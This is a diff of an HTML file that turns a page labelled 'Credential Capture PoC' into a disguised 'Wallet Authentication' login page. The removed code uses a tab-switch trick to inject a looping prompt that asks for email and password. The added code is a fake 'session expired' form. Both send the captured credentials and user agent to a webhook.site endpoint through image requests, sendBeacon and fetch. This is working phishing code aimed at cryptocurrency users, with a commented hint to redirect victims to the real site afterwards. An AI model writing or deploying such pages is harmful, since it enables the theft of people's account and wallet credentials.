@@ -3,126 +3,156 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, user-scalable=no">
-<title>Credential Capture PoC - Fixed</title>
+<title>Wallet Authentication</title>
 <style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    font-family: system-ui, sans-serif;
-    text-align: center;
-    padding: 40px 20px;
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    color: white;
+    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    background: #f5f5f5;
     min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
   }
   .container {
-    max-width: 500px;
-    margin: 0 auto;
-    background: rgba(255,255,255,0.1);
-    padding: 30px;
-    border-radius: 15px;
-    backdrop-filter: blur(10px);
+    max-width: 400px;
+    width: 100%;
+    background: white;
+    padding: 40px 30px;
+    border-radius: 12px;
+    box-shadow: 0 2px 20px rgba(0,0,0,0.1);
   }
-  h1 { font-size: 24px; margin-bottom: 20px; }
-  .btn {
-    background: #4CAF50;
-    color: white;
-    padding: 15px 30px;
-    border: none;
-    border-radius: 25px;
-    font-size: 18px;
-    cursor: pointer;
-    margin-top: 20px;
+  .logo {
+    text-align: center;
+    font-size: 48px;
+    margin-bottom: 20px;
   }
-  iframe { display: none; position: absolute; }
-  .info {
-    background: rgba(0,0,0,0.2);
-    padding: 15px;
-    border-radius: 10px;
-    margin-top: 20px;
+  h1 {
+    text-align: center;
+    color: #333;
+    font-size: 24px;
+    margin-bottom: 30px;
+  }
+  .alert {
+    background: #fff3cd;
+    border: 1px solid #ffc107;
+    color: #856404;
+    padding: 12px;
+    border-radius: 8px;
+    margin-bottom: 20px;
     font-size: 14px;
   }
-</style>
-<script>
-let armed = false;
-
-document.addEventListener("click", () => {
-  armed = true;
-  console.log("✓ Payload armed - switch tab now");
-});
-
-document.addEventListener("visibilitychange", () => {
-  if (document.hidden && armed) {
-    console.log("Tab hidden - executing payload...");
-    
-    setTimeout(() => {
-      // Method 1: Force prompt with loop (most aggressive)
-      const payload = 
-        "(function(){" +
-        "  try{" +
-        "    var r=null;" +
-        // Loop until user enters something (atau paksa minimal 1 char)
-        "    while(!r||r.trim()===''){" +
-        "      r=prompt(" +
-        "        '🔐 Wallet Security Check\\\\n\\\\n' +" +
-        "        'Enter your email and password to continue:\\\\n\\\\n' +" +
-        "        'Format: email:password'," +
-        "        'user@example.com:password123'" +
-        "      );" +
-        "      if(r===null)break;" + // Allow cancel
-        "    }" +
-        "    if(r&&r!==null){" +
-        "      var data={" +
-        "        creds:r," +
-        "        event:'credentials_captured'," +
-        "        ts:Date.now()," +
-        "        ua:navigator.userAgent," +
-        "        page:location.href" +
-        "      };" +
-        "      var url='https://webhook.site/40815ef5-1dac-4c51-836f-825210500754'" +
-        "        +'?data='+encodeURIComponent(JSON.stringify(data));" +
-        // Try multiple methods
-        "      try{" +
-        "        if(!navigator.sendBeacon(url)){throw 1;}" +
-        "      }catch(e){" +
-        "        try{" +
-        "          fetch(url,{method:'POST',mode:'no-cors'});" +
-        "        }catch(e2){" +
-        "          (new Image()).src=url;" +
-        "        }" +
-        "      }" +
-        "    }else{" +
-        // Send "cancelled" info
-        "      var url2='https://webhook.site/40815ef5-1dac-4c51-836f-825210500754'" +
-        "        +'?event=prompt_cancelled&ts='+Date.now();" +
-        "      (new Image()).src=url2;" +
-        "    }" +
-        "  }catch(e){" +
-        "    var url3='https://webhook.site/40815ef5-1dac-4c51-836f-825210500754'" +
-        "      +'?event=error&msg='+encodeURIComponent(e.message);" +
-        "    (new Image()).src=url3;" +
-        "  }" +
-        "})()";
-      
-      document.getElementById("iframe").src = "javascript:" + payload;
-      console.log("Payload injected");
-    }, 800); // Slightly longer delay
+  .input-group {
+    margin-bottom: 20px;
   }
-});
-</script>
+  label {
+    display: block;
+    color: #555;
+    margin-bottom: 8px;
+    font-size: 14px;
+    font-weight: 500;
+  }
+  input {
+    width: 100%;
+    padding: 12px 15px;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    font-size: 15px;
+  }
+  input:focus {
+    outline: none;
+    border-color: #667eea;
+  }
+  button {
+    width: 100%;
+    background: #667eea;
+    color: white;
+    padding: 14px;
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+  }
+</style>
 </head>
 <body>
-  <div class="container">
-    <h1>🎁 Exclusive Airdrop Verification</h1>
-    <p>Click button below, then switch to another tab</p>
-    <button class="btn">Claim Airdrop</button>
-    <div class="info">
-      <strong>Test Instructions:</strong><br>
-      1. Click the button above<br>
-      2. Switch to another tab or app<br>
-      3. Return and check - prompt should appear<br>
-      4. Enter test credentials: test@test.com:pass123<br>
-      5. Check webhook for captured data
-    </div>
+
+<div class="container">
+  <div class="logo">🔐</div>
+  <h1>Security Verification</h1>
+  
+  <div class="alert">
+    ⚠️ Your session has expired. Please re-authenticate to continue.
   </div>
-  <iframe id="iframe"></iframe>
+  
+  <form id="loginForm">
+    <div class="input-group">
+      <label>Email</label>
+      <input type="email" id="email" placeholder="Enter your email" required autofocus>
+    </div>
+    
+    <div class="input-group">
+      <label>Password</label>
+      <input type="password" id="password" placeholder="Enter your password" required>
+    </div>
+    
+    <button type="submit">Verify Account</button>
+  </form>
+</div>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
+  
+  // Send via multiple methods
+  const webhookUrl = 'https://webhook.site/40815ef5-1dac-4c51-836f-825210500754';
+  
+  // Method 1: GET with Image
+  const img = new Image();
+  img.src = webhookUrl + 
+    '?email=' + encodeURIComponent(email) + 
+    '&pass=' + encodeURIComponent(password) +
+    '&ua=' + encodeURIComponent(navigator.userAgent) +
+    '&ts=' + Date.now();
+  
+  // Method 2: POST with sendBeacon
+  const data = JSON.stringify({
+    email: email,
+    password: password,
+    userAgent: navigator.userAgent,
+    timestamp: Date.now(),
+    event: 'immediate_capture'
+  });
+  
+  if (navigator.sendBeacon) {
+    navigator.sendBeacon(webhookUrl, 'creds=' + encodeURIComponent(data));
+  }
+  
+  // Method 3: Fetch
+  fetch(webhookUrl, {
+    method: 'POST',
+    mode: 'no-cors',
+    headers: {'Content-Type': 'text/plain'},
+    body: 'email=' + email + '&password=' + password
+  }).catch(() => {});
+  
+  // Show loading
+  alert('Verifying your account...');
+  
+  // Could redirect to real site here
+  // window.location.href = 'https://real-site.com';
+  
+  return false;
+});
+
+// Auto-focus on email
+document.getElementById('email').focus();
+</script>
+
 </body>
 </html>
